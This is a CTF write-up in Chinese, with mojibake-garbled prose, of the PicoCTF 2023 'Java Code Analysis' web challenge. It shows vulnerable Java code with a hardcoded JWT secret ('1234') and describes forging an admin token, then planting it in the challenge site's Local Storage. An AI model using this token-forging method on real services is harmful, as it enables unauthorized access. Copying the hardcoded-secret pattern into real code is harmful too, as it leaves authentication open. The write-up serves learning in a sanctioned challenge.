---
title: "PicoCTF 2023 Web Exploitation - Java Code Analysis!?!"
date: 2023-03-16 15:54:38
description: "PicoCTF 2023 Web Exploitation åœ¨çº¿ä¹¦æ¶ é¢˜è§£"
index_img: /img/index_img/2023-03-16-picoctf-2023-web-exploitation-java-code-analysis.webp
author: è°­ç¦¹èˆŸ
categories: 
- CSç«èµ›åšé¢˜ç¬”è®°
tags:
- PicoCTF
- JWT
---



## ç®€å•è¯»ä¸ªé¢˜

æœ‰ä¸€ä¸ªåœ¨çº¿ç”µå­ä¹¦é˜…è¯»ç½‘ç«™â€œBookShelf Picoâ€ï¼Œå†…éƒ¨å­˜æœ‰å‡ æœ¬ä¹¦ï¼Œæˆ‘ä»¬æ‰€éœ€è¦åšçš„ï¼Œæ˜¯æ‰“å¼€ä»…ä¸ºâ€œAdminâ€æƒé™ç”¨æˆ·çš„ä¸“å±å›¾ä¹¦â€œFlagâ€ã€‚

é¦–å…ˆä¸‹è½½é¡¹ç›®æºä»£ç ï¼š

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316183914453.webp)

æ ¹æ®Hint 3çš„æç¤ºï¼Œæˆ‘ä»¬å…ˆçœ‹READMEé‡Œè¯´äº†äº›ä»€ä¹ˆï¼ˆåœ¨æœ¬åœ°å°è¯•æŠŠå…¶ä»–å¼€æºä»£ç è·‘èµ·æ¥ç¬¬ä¸€æ­¥äº¦æ˜¯å¦‚æ­¤ï¼‰

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316184153206.webp)

ä»ä¸Šé¢è¿™ä¸€æ®µæˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚ä½•å»æ‰“åŒ…æ•´ä¸ªé¡¹ç›®ï¼Œç”ŸæˆjaråŒ…ï¼Œå¹¶è¿è¡Œå®ƒ



## å…ˆæ¥è¯•è¯•æ°´

ä¸ºäº†æ–¹ä¾¿åœ¨æœ¬åœ°è¿›è¡Œè°ƒè¯•ï¼Œæˆ‘ä»¬é¦–å…ˆæŠŠä»£ç æ‰“åŒ…ä¸€æ¬¡ï¼ˆ./gradlew buildï¼‰

P.S. éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¦–æ¬¡æ‰“åŒ…gradleä¼šå…ˆä¸‹è½½è¿™ä¸ªé¡¹ç›®æ‰€éœ€è¦çš„ä¾èµ–åº“ï¼Œéœ€è¦èŠ±ä¸€ç‚¹æ—¶é—´ï¼Œè€å¿ƒç­‰å¾…ä¸€ä¸‹~

```bash
C:\Users\TANHUA\Desktop\pico\bookshelf-pico>.\gradlew build

***ä»¥ä¸‹çœç•¥ä¸€å †ä¾èµ–ä¸‹è½½è¿‡ç¨‹çš„è¾“å‡º***

> Task :test
2023-03-16 18:12:02.691  INFO 30480 --- [extShutdownHook] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
2023-03-16 18:12:02.694  INFO 30480 --- [extShutdownHook] o.s.s.concurrent.ThreadPoolTaskExecutor  : Shutting down ExecutorService 'applicationTaskExecutor'
2023-03-16 18:12:02.696  INFO 30480 --- [extShutdownHook] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Shutdown initiated...
2023-03-16 18:12:02.702  INFO 30480 --- [extShutdownHook] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Shutdown completed.

BUILD SUCCESSFUL in 29s
6 actionable tasks: 4 executed, 2 up-to-date
```



åœ¨çœ‹åˆ°è¿™ä¸€è¡Œä»¥åï¼Œé‚£è¯æ˜æ‰“åŒ…å·²ç»å®Œæˆäº†ï¼Œæ‰¾åˆ°jaråŒ…ï¼Œåœ¨cmdé‡Œè¿è¡Œå®ƒï¼ˆjava -jar bookshelf-base-server-0.0.1-SNAPSHOT.jarï¼‰

P.S. ä»€ä¹ˆï¼Ÿcmdæ€ä¹ˆè·‘ï¼Ÿåœ¨æ–‡ä»¶ç®¡ç†å™¨é¡¶éƒ¨çš„åœ°å€æ é‡Œæ¸…ç©ºä¹‹å‰çš„å†…å®¹ï¼Œå¹¶è¾“å…¥cmdç„¶åå›è½¦ï¼Œä½ å°±ä¼šçœ‹è§ä¸€ä¸ªé»‘è‰²æ¡†æ¡†äº†ï¼Œè¿™å°±æ˜¯cmd

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316185207056.webp)

åœ¨ç»è¿‡ä¸€æ®µæ—¶é—´çš„è·‘ç ï¼Œçœ‹åˆ°è¿™å¥è¯ä»¥åï¼š

```bash
2023-03-16 19:02:18.545  INFO 30712 --- [           main] i.g.n.pico.configs.BookShelfConfig       : app is now ready to use!
```



ä½ å°±å¯ä»¥åœ¨æµè§ˆå™¨é‡Œè¾“å…¥localhost:8080ï¼Œè®¿é—®åœ¨ä½ æœ¬åœ°è¿è¡Œçš„bookshelfäº†

P.S. ä¸ºä»€ä¹ˆæ˜¯8080ç«¯å£å‘¢ï¼Ÿå› ä¸ºåœ¨å‰é¢è·‘ç çš„è¿‡ç¨‹ä¸­ï¼Œå‘½ä»¤è¡Œå·²ç»å‘Šè¯‰ä½ Tomcatï¼ˆä¸€ä¸ªåŸºäºJavaçš„WebæœåŠ¡å™¨ï¼‰è¿è¡Œåœ¨8080ï¼ˆTomcatçš„é»˜è®¤ç«¯å£ï¼‰

```bash
2023-03-16 18:12:17.204  INFO 18600 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
2023-03-16 18:12:17.204  INFO 18600 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.39]
2023-03-16 18:12:17.380  INFO 18600 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
```



![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316190248838.webp)

PicoCTFç»™æˆ‘ä»¬çš„è´¦å·å¯†ç æ˜¯userã€userã€‚ä½¿ç”¨è¿™ä¸ªè´¦å·ç™»é™†ä»¥åï¼Œä½ ä¼šçœ‹åˆ°ä¸€å…±æœ‰ä¸‰æœ¬ä¹¦

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316190436611.webp)

æ˜¾ç„¶æ˜“è§ï¼Œä»…å‡­æˆ‘ä»¬ç›®å‰ç°æœ‰çš„Freeæƒé™è´¦å·ï¼Œæ˜¯æ— æ³•æ‰“å¼€é˜…è¯»ç”µå­ä¹¦â€œFlagâ€çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬çš„**ä¸‹ä¸€ä¸ªç›®æ ‡**ï¼Œå°±æ˜¯æŠŠæˆ‘ä»¬çš„ç°æœ‰è´¦å·ææƒï¼Œæ‹¿åˆ°Adminæƒé™ã€‚



## ä»€ä¹ˆâ€œææƒâ€

å°±åƒä¸Šé¢åˆšåˆšè¯´çš„é‚£æ ·ï¼Œæˆ‘ä»¬åŒºåŒºä¸€ä¸ªFreeç”¨æˆ·ï¼Œæ€ä¹ˆå¯ä»¥çœ‹Adminç®¡ç†å‘˜å¤§äººä»¬çš„ä¹¦å‘¢ï¼Ÿä¸ºäº†åŒºåˆ†ä¸åŒçš„ç”¨æˆ·æƒé™ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€å¥—ç”¨æˆ·é‰´æƒç³»ç»Ÿã€‚

æ ¹æ®Hint 1çš„æç¤ºï¼ŒBookshelfè¿™ä¸ªé¡¹ç›®ç”¨çš„æ˜¯JWTè¿™ä¸ªå¼€æºåº“æ¥è¿›è¡Œçš„ç”¨æˆ·é‰´æƒã€‚

ï¼ˆå…³äºJWTçš„ä»‹ç»ï¼Œå¯ä»¥çœ‹çœ‹[è¿™é‡Œçš„è§£é‡Š](https://zhuanlan.zhihu.com/p/433674847)ï¼‰

ç®€è€Œè¨€ä¹‹ï¼Œåœ¨æˆ‘ä»¬ç™»é™†çš„æ—¶å€™ï¼Œç½‘é¡µå‰ç«¯ä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„è´¦å·å¯†ç é€šè¿‡ç™»å½•APIæ¥å£ï¼Œå‘é€ç»™æœåŠ¡å™¨åç«¯ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬æ­£åœ¨è¿è¡Œçš„jaråŒ…ï¼‰

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316191656050.webp)
![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316192436044.webp)

å¾…æœåŠ¡å™¨æ ¡éªŒå®Œè´¦å·å¯†ç æ— è¯¯åï¼Œå°±ä¼šæŠŠä¸€æ®µä»£è¡¨ç€æˆ‘ä»¬å½“å‰ç™»å½•è´¦æˆ·çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬ç”¨æˆ·IDï¼Œç”¨æˆ·åï¼Œç”¨æˆ·æƒé™ï¼‰ï¼Œä»¥ä¸€æ®µé€šè¿‡æœåŠ¡å™¨æ‰€å­˜å‚¨çš„å¯†é’¥æ¥åŠ å¯†çš„Payloadå­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ç»™æˆ‘ä»¬ã€‚

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316192856140.webp)

å‰ç«¯åœ¨æ”¶åˆ°Payloadå­—ç¬¦ä¸²åä¼šå­˜åˆ°æµè§ˆå™¨çš„Local Storageï¼Œåœ¨ä¹‹åçš„æ¥å£è¯·æ±‚ä¸­ï¼Œå‰ç«¯å°±ä¼šæŠŠè¿™æ®µPayloadå­—ç¬¦ä¸²æ”¾åœ¨è¯·æ±‚å¤´Headerçš„Authorizationå­—æ®µå†…ï¼Œå‘é€è‡³æœåŠ¡å™¨åç«¯

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316192535933.webp)

åŸºäºæœ¬é¢˜çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»ä¼ªé€ Payloadå­—ç¬¦ä¸²åŠ¨æ‰‹ã€‚



## è¿ˆå¼€æ­¥å­ï¼Œå‘å‰èµ°

JWTè¿™å¥—é‰´æƒæ–¹æ¡ˆå¥½æ˜¯å¥½ï¼Œæœ‰ä¸ªç¼ºç‚¹ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“åŠ å¯†Payloadç”¨çš„å¯†é’¥ï¼Œä»¥åŠPayloadå†…çš„æ•°æ®ç»“æ„ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ˜“ä¼ªé€ å‡ºä»»æ„è´¦å·ã€æƒé™çš„Payloadã€‚

æ•°æ®ç»“æ„å¾ˆç®€å•ï¼Œæˆ‘ä»¬å·²ç»æœ‰é¡¹ç›®æºç äº†ã€‚é‚£ä¹ˆææƒçš„å…³é”®ï¼Œå°±åœ¨äºæˆ‘ä»¬æ˜¯å¦èƒ½å¾—åˆ°åœ¨PicoCTFçš„çº¿ä¸Šç¯å¢ƒå†…ï¼ŒJWTæ‰€ä½¿ç”¨çš„åŠ å¯†å¯†é’¥ã€‚

é‚£ä¹ˆå°±è®©æˆ‘ä»¬çœ‹çœ‹JWTçš„åŠ å¯†å¯†é’¥æ˜¯æ€ä¹ˆæ¥çš„ã€‚åœ¨é¡¹ç›®å†…çš„â€œ/src/main/java/io/github/nandandesai/pico/security/JwtService.javaâ€ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒåŠ å¯†å¯†é’¥æ˜¯åœ¨åˆå§‹åŒ–JwtServiceè¿™ä¸ªæœåŠ¡æ—¶ï¼Œä»SecretGeneratorè¿™ä¸ªç±»è·å–çš„ï¼š

```java
@Autowired
public JwtService(SecretGenerator secretGenerator){
    this.SECRET_KEY = secretGenerator.getServerSecret();
}
```



æ²¿ç€è¿™ä¸ªçº¿ç´¢å¾€ä¸‹æ‰¾ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨SecretGeneratorç±»ï¼ˆâ€œ/src/main/java/io/github/nandandesai/pico/security/SecretGenerator.javaâ€ï¼‰çš„getServerSecretæ–¹æ³•å®ç°ä¸­çœ‹åˆ°ï¼Œç¨‹åºä¼šå…ˆå°è¯•è¯»å–â€œserver_secret.txtâ€è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é€šè¿‡è°ƒç”¨generateRandomStringæ–¹æ³•ï¼Œç”Ÿæˆä¸€ä¸ª32ä½çš„éšæœºå­—ç¬¦ä¸²ã€‚

```java
@Service
class SecretGenerator {
    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

    @Autowired
    private UserDataPaths userDataPaths;

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
}
```



ç„¶è€Œï¼Œä½ å¯èƒ½å‘ç°äº†ï¼Œè¿™ä¸ªgenerateRandomStringæ–¹æ³•ï¼Œå‹æ ¹å°±ä¸éšæœºï¼Œè€Œæ˜¯ç¡¬ç¼–ç å†™æ­»çš„â€œ1234â€ã€‚

è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±èƒ½æ”¾å¿ƒäº†ï¼ŒçŸ¥é“å¯†é’¥ä¸€å®šæ˜¯ç›¸åŒçš„ã€‚

è¿™æ—¶ï¼Œè®©æˆ‘ä»¬å†å›åˆ°JwtServiceè¿™ä¸ªç±»æ¥ï¼Œçœ‹çœ‹Payloadçš„ç”Ÿæˆï¼Œæ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿ

```java
public String createToken(Integer userId, String email, String role){
    Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);

    Calendar expiration = Calendar.getInstance();
    expiration.add(Calendar.DATE, 7); //expires after 7 days

    return JWT.create()
            .withIssuer(ISSUER)
            .withIssuedAt(new Date())
            .withExpiresAt(expiration.getTime())
            .withClaim(CLAIM_KEY_USER_ID, userId)
            .withClaim(CLAIM_KEY_EMAIL, email)
            .withClaim(CLAIM_KEY_ROLE, role)
            .sign(algorithm);
}
```



createTokenè¿™ä¸ªå‡½æ•°ï¼Œåœ¨ä¼ å…¥äº†userIdï¼Œemailï¼Œroleä¸‰ä¸ªå‚æ•°ä¹‹åï¼Œä¼šç”±JWTç”Ÿæˆä¸€ä¸ªæœ‰æ•ˆæœŸä¸º7å¤©çš„Payloadã€‚



è¿™æ—¶ï¼Œå¿ƒæ€¥çš„ä½ æˆ–è®¸ä¼šå°è¯•ä»¥ä¸‹æ–¹æ³•æ¥è·å–ä¸€ä¸ªadminæƒé™çš„Payloadï¼š

```java
public String createToken(Integer userId, String email, String role){
    Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);

    Calendar expiration = Calendar.getInstance();
    expiration.add(Calendar.DATE, 7); //expires after 7 days

    role = "Admin";
    System.out.println("!!!!!!!!! role: " + role);

    return JWT.create()
            .withIssuer(ISSUER)
            .withIssuedAt(new Date())
            .withExpiresAt(expiration.getTime())
            .withClaim(CLAIM_KEY_USER_ID, userId)
            .withClaim(CLAIM_KEY_EMAIL, email)
            .withClaim(CLAIM_KEY_ROLE, role)
            .sign(algorithm);
}
```



ç„¶è€Œä½ ä¼šå‘ç°ï¼Œè™½ç„¶ä½ åœ¨ç™»å½•è¿›userè´¦æˆ·åï¼Œæ˜¾ç¤ºä½ ä¸ºAdminæƒé™ã€‚ç„¶è€Œåœ¨ä½ ç‚¹è¿›â€œFlagâ€è¿™æœ¬ä¹¦ä¸€æ¢ç©¶ç«Ÿæ—¶ï¼Œå´ä¼šå¾—åˆ°401ï¼ˆUnauthorizedï¼‰çš„è¿”å›ç ã€‚



è¿™æ˜¯å› ä¸ºï¼Œè™½ç„¶ä½ ç›®å‰å·²ç»æ‹¿åˆ°äº†â€œè™šå‡â€çš„Adminæƒé™ï¼Œä½†ä½ çš„è´¦å·ï¼Œåœ¨æ•°æ®åº“é‡Œç™»è®°çš„ä¾ç„¶æ˜¯Freeæƒé™ã€‚å”¯èƒ½å¾—åˆ°ä¸€ä¸ªçœŸæ­£çš„Adminè´¦å·ï¼Œæˆ‘ä»¬æ‰èƒ½çœ‹åˆ°è¿™æœ¬â€œFlagâ€ã€‚



äºæ˜¯ï¼Œæˆ‘ä»¬åˆå¼€å§‹å¯»æ‰¾æ•°æ®åº“é‡Œçš„æ•°æ®ï¼Œæ˜¯ç”±è°è¿›è¡Œåˆå§‹åŒ–çš„å‘¢ï¼Ÿæ¯•ç«Ÿåœ¨æˆ‘ä»¬åˆšä¸‹è½½å¥½æºä»£ç æ—¶ï¼Œé¡¹ç›®æ–‡ä»¶å¤¹é‡Œå¯æ²¡æœ‰ä»»ä½•æ•°æ®åº“çš„æ–‡ä»¶å‘€ã€‚

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316195740362.webp)

P.S. è¿™ä¸ªä»£è¡¨ç€æ•°æ®åº“å­˜æ”¾åœ°ç‚¹çš„æ–‡ä»¶å¤¹æ˜¯åœ¨åˆæ¬¡è¿è¡Œåæ‰å‡ºç°çš„ğŸ‘†



åœ¨é¡¹ç›®æ–‡ä»¶å¤¹å†…å°è¯•è¿›è¡Œå…¨å±€æœç´¢ï¼ŒæŸ¥æ‰¾â€œ"user"â€è¿™ä¸ªå…³é”®è¯ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œuserè¿™ä¸ªè´¦æˆ·çš„ä¿¡æ¯ä¹Ÿæ˜¯å†™æ­»åœ¨äº†BookShelfConfigç±»ä¸­ï¼ˆâ€œ/src/main/java/io/github/nandandesai/pico/configs/BookShelfConfig.javaâ€ï¼‰ï¼š

```java
/*
 * Initialize admin and a user
 * */
User freeUser = new User();
freeUser.setProfilePicName("default-avatar.webp")
        .setRole(FreeRole)
        .setLastLogin(LocalDateTime.now())
        .setFullName("User")
        .setEmail("user")
        .setPassword(passwordEncoder.encode("user"));
userRepository.save(freeUser);

User admin = new User();
admin.setProfilePicName("default-avatar.webp")
        .setRole(AdminRole)
        .setLastLogin(LocalDateTime.now())
        .setFullName("Admin")
        .setEmail("admin")
        .setPassword(passwordEncoder.encode("<redacted>"));
userRepository.save(admin);

logger.info("initialized 'admin' and 'user' users.");
```



çœŸæ˜¯åŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œåªè¦æˆ‘ä»¬èƒ½ä¼ªé€ ä¸‹é¢é‚£ä¸ªadminçš„è´¦å·ï¼Œæˆ‘ä»¬å°±èƒ½æ‹¿åˆ°ä¸€ä¸ªè´§çœŸä»·å®çš„adminæƒé™è´¦å·äº†ï¼

åªè¦æˆ‘ä»¬å¦‚æ³•ç‚®åˆ¶ï¼Œå†æ¬¡ä¿®æ”¹SecretGeneratorç±»getServerSecretçš„å®ç°ï¼Œå°±èƒ½æ‹¿åˆ°adminè´¦å·çš„Payloadï¼Œä»è€Œæ‰“å¼€â€œFlagâ€è¿™æœ¬ä¹¦äº†ï¼š

```java
public String createToken(Integer userId, String email, String role){
    Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);

    Calendar expiration = Calendar.getInstance();
    expiration.add(Calendar.DATE, 7); //expires after 7 days

    role = "Admin";
    email = "admin";
    userId = 2;//ä»â€œuserâ€è´¦æˆ·çš„userIdæ¨å‡ºçš„æ¥ï¼Œå…ˆæ˜¯åˆ›å»ºäº†userè´¦æˆ·ï¼ˆidä¸º1ï¼‰ï¼Œååˆ›å»ºäº†adminè´¦æˆ·ï¼ˆidä¸º2ï¼‰
    System.out.println("!!!!!!!!! role: " + role);

    return JWT.create()
            .withIssuer(ISSUER)
            .withIssuedAt(new Date())
            .withExpiresAt(expiration.getTime())
            .withClaim(CLAIM_KEY_USER_ID, userId)
            .withClaim(CLAIM_KEY_EMAIL, email)
            .withClaim(CLAIM_KEY_ROLE, role)
            .sign(algorithm);
}
```



åœ¨ä¿®æ”¹ä»£ç åå†æ¬¡æ‰“åŒ…é¡¹ç›®jaråŒ…å¹¶è¿è¡Œã€‚ç­‰å¾…è·‘ç ç»“æŸï¼Œæµè§ˆå™¨æ‰“å¼€localhost:8080ï¼Œç™»å½•userã€userè´¦å·åï¼ˆè‹¥ä»ä¿ç•™ä¹‹å‰çš„ç™»é™†çŠ¶æ€éœ€é‡æ–°ç™»é™†ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»ç™»å…¥adminè´¦å·å¹¶è·å¾—adminæƒé™ï¼š

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316201325266.webp)

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316201410610.webp)



## ç§»èŠ±æ¥æœ¨

çœ‹åˆ°è¿™é‡Œï¼Œä½ å¯èƒ½åˆæœ‰ç–‘é—®äº†â€”â€”æˆ‘ä»¬ç°åœ¨ä¸æ˜¯åœ¨æœ¬åœ°ç¯å¢ƒé‡Œè·‘å—ï¼Ÿè¿™åˆä¸æ˜¯PicoCTFçš„å®ä¾‹ï¼Œæ€ä¹ˆæ‹¿åˆ†å‘€ï¼Ÿ

ç­”æ¡ˆå¾ˆç®€å•ï¼Œå³å‡»å½“å‰ç½‘é¡µå¹¶ç‚¹å‡»â€œå®¡æŸ¥å…ƒç´ â€ï¼Œæˆ–æŒ‰ä¸‹F12ï¼Œæ‰“å¼€å¼€å‘äººå‘˜å·¥å…·ï¼Œè¿›å…¥â€œåº”ç”¨ï¼ˆApplicationï¼‰â€æ ‡ç­¾å¡ï¼š

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316201728791.webp)

æŸ¥çœ‹â€œå­˜å‚¨ï¼ˆStorageï¼‰â€ -> â€œæœ¬åœ°å­˜å‚¨ç©ºé—´ï¼ˆLocal Storageï¼‰â€ï¼Œå¤åˆ¶æˆ–è®°ä¸‹token-payloadå’Œauth-tokençš„å€¼

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316201956529.webp)

å†åœ¨PicoCTFå¼€å¯ä¸€ä¸ªæ–°çš„åœ¨çº¿å®ä¾‹ï¼Œå¦‚æ³•ç‚®åˆ¶ï¼Œå°†åˆšåˆšä¸Šé¢å¤åˆ¶çš„token-payloadå’Œauth-tokençš„å€¼å†ç²˜è´´åˆ°åœ¨çº¿å®ä¾‹ä¸‹çš„Local Storageå†…ï¼Œåˆ·æ–°ä¸€ä¸‹ç½‘é¡µï¼š

![](../img/post_assets/â€2023â€-0â€3â€-â€16-picoctf-2023-web-exploitation-java-code-analysis/image-20230316202705363.webp)

BINGO! (oã‚œâ–½ã‚œ)oâ˜†

<center><img src="/img/post_assets/chiluan-xixi.webp" style="zoom: 25%;background: transparent;" /></center>